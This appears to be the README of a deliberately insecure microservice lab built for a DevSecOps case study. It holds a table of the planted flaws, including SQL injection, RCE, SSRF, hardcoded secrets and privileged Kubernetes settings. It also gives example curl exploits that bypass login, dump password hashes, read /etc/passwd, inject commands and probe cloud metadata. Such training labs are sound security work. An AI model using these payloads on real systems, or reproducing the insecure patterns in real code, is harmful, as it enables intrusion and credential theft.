# SecureFlow — Vulnerable Baseline Environment

> **This environment is INTENTIONALLY INSECURE.**
> It exists as the "before" state for the SecureFlow DevSecOps case study.
> Do not deploy to production. Run only in an isolated lab/cluster.

---

## Architecture

```
Internet
    │
    ▼ :3000 / NodePort 30080
┌─────────────────┐
│   api-gateway   │  Node.js — routes all traffic, no auth
└────────┬────────┘
         │
    ┌────┴─────────────────────┐
    │           │              │
    ▼           ▼              ▼
┌────────┐ ┌─────────┐ ┌──────────┐
│  user  │ │product  │ │  order   │  Python/Flask + Node.js
│service │ │service  │ │ service  │
└───┬────┘ └────┬────┘ └────┬─────┘
    └───────────┼────────────┘
                ▼ :5432 / NodePort 30543
         ┌────────────┐
         │  postgres  │  Shared DB, hostPath volume
         └────────────┘
```

---

## Quick Start (Docker Compose)

```bash
cd secureflow/
docker-compose up --build

# Services now available:
#   API Gateway   → http://localhost:3000
#   User Service  → http://localhost:5000  (directly exposed)
#   Product Svc   → http://localhost:3001  (directly exposed)
#   Order Svc     → http://localhost:5001  (directly exposed)
#   PostgreSQL    → localhost:5432         (directly exposed)
```

---

## Kubernetes Deploy

```bash
# Requires: minikube, kind, or any K8s cluster
kubectl apply -f k8s/namespace.yaml
kubectl apply -f k8s/rbac.yaml
kubectl apply -f k8s/configmap.yaml
kubectl apply -f k8s/postgres/
kubectl apply -f k8s/api-gateway/
kubectl apply -f k8s/user-service/
kubectl apply -f k8s/product-service/
kubectl apply -f k8s/order-service/

# Wait for pods
kubectl get pods -n secureflow -w

# Access gateway (minikube)
minikube service api-gateway -n secureflow
```

---

## Vulnerability Index

### Application Layer

| ID | Service | Type | Endpoint / Location |
|----|---------|------|---------------------|
| A-01 | user-service | **SQL Injection** | `POST /login` — auth bypass via `admin' --` |
| A-02 | user-service | **SQL Injection** | `POST /register`, `GET /users/:id` |
| A-03 | user-service | **Broken Auth** | MD5 password hashing (no salt) |
| A-04 | user-service | **RCE** | `GET /debug/cmd?cmd=whoami` — unauthenticated OS exec |
| A-05 | user-service | **Sensitive Data Exposure** | `GET /users` — returns all users + password hashes, no auth |
| A-06 | user-service | **Hardcoded Secret** | `JWT_SECRET = 'supersecret123'` in source |
| A-07 | product-service | **SQL Injection** | `GET /products?search=` — UNION-based |
| A-08 | product-service | **IDOR** | `PUT/DELETE /products/:id` — no ownership check |
| A-09 | product-service | **Mass Assignment** | `POST /products` — user sets `internal_cost` |
| A-10 | product-service | **Info Disclosure** | Full DB stack traces in error responses |
| A-11 | order-service | **Command Injection** | `POST /orders` — `notes` field piped to `os.system` |
| A-12 | order-service | **SSRF** | `POST /orders/notify` — fetches any user-supplied URL |
| A-13 | order-service | **Hardcoded Secrets** | AWS Access Key + Secret in source code |
| A-14 | order-service | **Sensitive Data Exposure** | `GET /debug/config` — returns AWS keys + DB password |
| A-15 | api-gateway | **Info Disclosure** | `GET /debug/env` — dumps all environment variables |
| A-16 | api-gateway | **Missing Auth** | No authentication on any proxied route |
| A-17 | all services | **Broken Auth** | JWT tokens have no expiry (`exp` claim missing) |
| A-18 | all services | **Flask Debug** | `debug=True` — interactive debugger over the network |

### Container / Image Layer

| ID | Service | Type | Detail |
|----|---------|------|--------|
| C-01 | all | **Vulnerable Base Image** | `node:14` and `python:3.8` — both EOL with known CVEs |
| C-02 | all | **Running as Root** | No `USER` directive — uid 0 inside all containers |
| C-03 | all | **No Image Digest** | `image: latest` — supply chain risk |
| C-04 | all | **No Healthcheck** | `HEALTHCHECK` missing from all Dockerfiles |

### Kubernetes / Infrastructure Layer

| ID | Resource | Type | Detail |
|----|----------|------|--------|
| K-01 | all deployments | **Privileged Container** | `privileged: true` — full host kernel access |
| K-02 | all deployments | **Root in Container** | `runAsUser: 0` |
| K-03 | all deployments | **Privilege Escalation** | `allowPrivilegeEscalation: true` |
| K-04 | order-service | **Dangerous Capabilities** | `SYS_ADMIN`, `NET_ADMIN`, `SYS_PTRACE` added |
| K-05 | user-service | **hostPath Mount** | `/etc` from host mounted into container |
| K-06 | postgres | **hostPath Mount** | `/tmp/secureflow-pgdata` — container writes to host |
| K-07 | postgres | **DB Exposed via NodePort** | Port 30543 accessible on every cluster node |
| K-08 | api-gateway | **hostNetwork** | Shares host network namespace |
| K-09 | all | **cluster-admin RBAC** | Single SA with cluster-admin for all services |
| K-10 | configmap | **Secrets in ConfigMap** | Passwords, JWT secret, AWS keys in plaintext ConfigMap |
| K-11 | namespace | **No Resource Limits** | No LimitRange or ResourceQuota |
| K-12 | namespace | **No NetworkPolicy** | All pods can talk to all pods in the cluster |
| K-13 | namespace | **No PodSecurityAdmission** | Privileged pods not blocked by admission control |

### Secrets / Supply Chain

| ID | Location | Type | Detail |
|----|----------|------|--------|
| S-01 | `order-service/app.py` | **Hardcoded AWS Key** | `AKIAIOSFODNN7EXAMPLE` — Gitleaks AKIA pattern |
| S-02 | `user-service/app.py` | **Hardcoded JWT Secret** | `supersecret123` |
| S-03 | `k8s/configmap.yaml` | **Hardcoded Stripe Key** | `sk_test_4eC39HqLyjWDarjtT1zdp7dc` |
| S-04 | `docker-compose.yml` | **Hardcoded DB Password** | `admin123` committed to git |
| S-05 | all services | **No Image Signing** | Images not signed with Cosign |
| S-06 | all services | **No SBOM** | No software bill of materials generated |

---

## Example Exploits (for demo)

```bash
BASE=http://localhost:3000

# 1. SQL injection auth bypass — login as admin without knowing the password
curl -s -X POST $BASE/api/users/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin'\''--", "password": "anything"}'

# 2. Dump all users + password hashes (no auth needed)
curl -s $BASE/api/users/users

# 3. UNION-based SQL injection — read users table via product search
curl -s "$BASE/api/products/products?search=%25' UNION SELECT 1,username,email,password::text,role,6,7 FROM users--"

# 4. RCE via debug endpoint
curl -s "$BASE/api/users/debug/cmd?cmd=id"
curl -s "$BASE/api/users/debug/cmd?cmd=cat+/etc/passwd"

# 5. Command injection via order notes
curl -s -X POST $BASE/api/orders/orders \
  -H 'Content-Type: application/json' \
  -d '{"user_id":1,"product_id":1,"quantity":1,"notes":"x; id > /tmp/pwned"}'

# 6. SSRF — probe AWS metadata endpoint
curl -s -X POST $BASE/api/orders/orders/notify \
  -H 'Content-Type: application/json' \
  -d '{"webhook_url": "http://169.254.169.254/latest/meta-data/"}'

# 7. Leak all env vars (AWS keys, DB passwords, JWT secret)
curl -s $BASE/debug/env

# 8. Leak AWS credentials via order-service debug endpoint
curl -s $BASE/api/orders/debug/config
```

---

## What Each Security Tool Will Find

| Tool | Findings on This Repo |
|------|-----------------------|
| **Gitleaks** | AWS Access Key, JWT secret, DB password, Stripe key in source + compose |
| **Trivy (images)** | Hundreds of CVEs on `node:14` and `python:3.8` base images |
| **Trivy (k8s)** | Privileged containers, root users, hostPath mounts |
| **Checkov / tfsec** | Would flag equivalent IaC misconfigs if Terraform were added |
| **OPA / Gatekeeper** | Blocks privileged pods, root containers, hostPath, missing limits |
| **SonarQube** | SQL injection, command injection, hardcoded secrets |
| **OWASP ZAP (DAST)** | SQL injection, missing auth headers, debug endpoints |
| **Falco (runtime)** | Shell spawned inside container, /etc/passwd read, outbound SSRF |

---

## Next Step

Once you can run this environment and demonstrate the vulnerabilities, the next phase is layering in the security toolchain described in the case study brief — turning each finding above into a blocked pipeline stage or runtime alert.
